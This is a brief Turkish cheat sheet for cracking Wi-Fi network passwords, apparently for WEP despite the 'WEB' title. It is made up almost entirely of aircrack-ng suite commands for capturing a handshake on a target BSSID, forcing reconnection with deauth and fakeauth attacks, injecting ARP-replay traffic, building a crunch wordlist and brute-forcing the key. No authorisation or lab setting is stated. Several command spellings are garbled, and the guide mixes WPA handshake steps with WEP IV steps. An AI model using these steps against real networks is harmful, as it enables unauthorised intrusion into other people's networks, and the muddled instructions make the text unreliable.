# WEB Şifre Kırma
```aircrack -ng airodumptest.cap``` (Tarama Sırasında Yazdırdığımız Dosya)

## 1.Handshake Yakalama
``` airodump -ng --channel X --bssid XX:XX:XX:XX:XX:XX --write handshake-file wlan0mon```

* channel: Ağın çalıştığı kanal
* bssid: Ağın MAC adresi
* write: Yakalanan handshake'in nereye kayıt edileceği

**! Kolayca handshake yakalamak için ufak paketli deauth saldırı yapılabilir**

## 2.Wordlist Oluşturma
``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` içinde "0123456789abcdefgh" geçen min 6 maks 10
haneli şifre kombinasyonlarının olduğu passwrd isimli wordlist oluşturur

## 3.Şifre Kırma
``` aircrack -ng handshake-file.cap -w passwrd.txt```

---
---

## Eğer Ağda Yeteri Kadar Cihaz Yoksa
* fakeauuth yolla
* arpreplay çalıştır
* aircrack -ng çalıştır

### Fakeauth saldırısı yapıyoruz ağdan birisi düşüp tekrar bağlanırsa handshake yakalamamız kolaylaşır
```aireplay -ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon```

```aireplay -ng --arpreplay -b XX:XX:XX:XX:XX:xX -h YY:YY:YY:YY:YY:YY wlan0mon``` belirlenen cihaza IV yollamamızı sağlar

* **192.168.1.1** modeminizin ara yüzüne giriş yaparsınız









